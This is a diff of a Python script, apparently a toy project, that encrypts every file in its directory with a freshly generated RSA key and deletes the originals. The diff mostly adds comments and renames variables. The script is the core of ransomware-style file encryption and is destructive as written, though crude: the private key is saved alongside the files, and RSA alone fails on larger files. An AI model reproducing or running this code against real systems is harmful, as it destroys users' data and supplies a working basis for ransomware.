@@ -5,39 +5,46 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 import os
 
+# Create list of files in directory to encrypt
 list = os.listdir(path='.')
 list.remove("Key_Encrypt.py")
 list.remove("Decrypt_key.py")
-print(list)
 
-# Generating a key
-private_key = rsa.generate_private_key(
+# Generate public and private keys
+priv_key = rsa.generate_private_key(
         public_exponent=65537,
         key_size=2048,
         backend=default_backend()
     )
-public_key = private_key.public_key()
+pub_key = priv_key.public_key()
 
-# Storing the keys
-key = private_key.private_bytes(
+# Sterilize private key
+key = priv_key.private_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PrivateFormat.PKCS8,
         encryption_algorithm=serialization.NoEncryption()
     )
-privkey = open('private_key.pem', 'wb')
+# Store private key in seperate file
+privkey = open('priv_key.pem', 'wb')
 privkey.write(key)
 
-key = public_key.public_bytes(
+# Sterilize private key
+key = pub_key.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo
     )
-pubkey = open('public_key.pem', 'wb')
+# Store private key in seperate file
+pubkey = open('pub_key.pem', 'wb')
 pubkey.write(key)
+# Clear key varible
 key = ""
+
+# Loop through all files in directory and encrypt
 for x in list:
-    # Encrypting
+    # Open x file
     file = open(x, "rb")
-    encrypt = public_key.encrypt(
+    # Encrypt x file
+    encrypt = pub_key.encrypt(
         file.read(),
         padding.OAEP(
             mgf=padding.MGF1(algorithm=hashes.SHA256()),
@@ -45,13 +52,16 @@ for x in list:
             label=None
         )
     )
+    # Close x file and clear file varible
     file.close()
     file = ""
 
-    # Delete Originals and make new encrypted file
+    # Delete original x file
     os.remove(x)
+    # Make new encrypted file and write to it
     filename = str(x + ".enc")
     encryptedFile = open(filename, "wb")
     encryptedFile.write(encrypt)
+    # Close encyrpted file and clear encryptedfile varible
     encryptedFile.close()
     encryptedFile = ""
